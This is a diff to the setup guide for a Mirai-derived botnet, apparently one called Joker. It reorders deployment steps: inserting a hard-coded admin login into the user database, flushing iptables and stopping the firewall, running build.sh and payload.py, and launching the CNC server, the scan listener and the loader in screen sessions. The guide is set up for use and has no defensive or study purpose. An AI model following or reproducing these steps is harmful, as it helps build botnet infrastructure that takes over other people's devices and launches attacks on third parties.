@@ -176,9 +176,6 @@ CREATE TABLE `whitelist` (
 );
 ```
 ```
-INSERT INTO users VALUES (NULL, 'clown', 'clown1337', 0, 0, 0, 0, -1, 1, 30, '');
-```
-```
 CREATE TABLE `logins` (
   `id` int(11) NOT NULL,
   `username` varchar(32) NOT NULL,
@@ -186,21 +183,14 @@ CREATE TABLE `logins` (
   `ip` varchar(15) NOT NULL,
   `timestamp` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP
 ) ENGINE=InnoDB DEFAULT CHARSET=latin1;
+```
+```
+INSERT INTO users VALUES (NULL, 'clown', 'clown1337', 0, 0, 0, 0, -1, 1, 30, '');
+```
+```
 exit;
 ```
-
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-```
-service firewalld stop
-iptables -F;service iptables stop 
-```
-```
-service httpd restart  
-```
-```
-service mariadb restart
-```
-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 ```
 nano /usr/include/bits/typesizes.h
 ```
@@ -214,28 +204,33 @@ ulimit -n999999; ulimit -u999999; ulimit -e999999
 ```
 
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
-Sao chép & Dán: 
 ```
 cd ~/; chmod 0777 * -R; sh build.sh
 ```
-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ```
 python payload.py; service httpd restart 
 ```
-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+```
+iptables -F;service iptables stop 
+service httpd restart  
+service mysqld restart
+```
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 ```
 cd ~/
 screen -S cnc ./cnc
 ```
+
+CTRL A D
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ```
 cd loader/
 screen -S rep ./scanListen 
 ```
+CTRL A D
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ```
 screen -S loader
 ./run.sh
 ```
-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-[Nguồn](https://github.com/USBBios/Joker-Mirai-Botnet-Source-V1)
+CTRL A D
